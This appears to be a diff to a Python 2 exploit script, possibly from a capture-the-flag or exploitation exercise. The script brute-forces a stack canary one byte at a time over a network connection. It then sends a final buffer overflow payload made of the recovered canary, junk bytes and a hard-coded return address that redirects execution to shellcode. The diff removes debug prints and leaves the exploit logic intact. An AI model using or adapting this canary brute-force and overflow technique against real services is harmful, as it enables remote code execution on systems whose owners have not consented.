@@ -49,26 +49,13 @@ def exploit(host, port, shellcode):
                 continue
             try_char = struct.pack("<I", i)[:1]
             cur_exploit = sploitstring + canary + try_char
-            print ":".join("{:x}".format(ord(c)) for c in canary + try_char)
-            print len(cur_exploit)
-            if try_exploit(cur_exploit, host, port):
-                # Connection closed by server
-                print "crashed"
-            else:
+            if not try_exploit(cur_exploit, host, port):
                 # Connection still up
-                print "works"
                 canary += try_char
                 count += 1
                 break
-    print ":".join("{:x}".format(ord(c)) for c in canary)
     final_exploit = sploitstring + canary + "JUNKJUNK" + struct.pack("<I", 0xbfffeddc) + struct.pack("<I", 0xbfffeddc)
-    print repr(final_exploit)
-    if try_exploit(final_exploit, host, port):
-        # Connection closed by server
-        print "crashed"
-    else:
-        # Connection still up
-        print "works"
+    try_exploit(final_exploit, host, port)
 
 ####
 
@@ -84,4 +71,3 @@ try:
 except:
     print("Exception:")
     print(traceback.format_exc())
-
